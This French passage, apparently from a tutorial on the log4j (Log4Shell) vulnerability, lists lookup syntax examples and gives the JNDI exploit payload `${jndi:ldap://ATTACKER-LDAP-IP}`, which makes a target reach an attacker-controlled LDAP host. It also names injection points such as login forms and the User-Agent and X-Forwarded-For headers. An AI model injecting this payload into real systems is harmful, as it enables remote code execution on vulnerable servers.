
Voici quelques exemples de syntaxe JNDI :

```c
${sys:os.name}
${sys:user.name}
${log4j:configParentLocation}
${ENV:PATH}
${ENV:HOSTNAME}
${java:version}
```

La charge utile générale pour exploiter cette vulnérabilité log4j ressemble à ceci :

```http
${jndi:ldap://ATTACKER-LDAP-IP}
```

-  le schéma `ldap://` indique que la cible atteindra un point final (un emplacement contrôlé par l'attaquant) via le protocole LDAP.

D'autres emplacements, vous pouvez fournir cette syntaxe JNDI :

- Zones de saisie, formulaires de connexion utilisateur et mot de passe, points de saisie de données dans les applications
- En-têtes HTTP tels que `User-Agent` ,`X-Forwarded-For` ou autres en-têtes personnalisables
- N'importe quel endroit pour les données fournies par l'utilisateur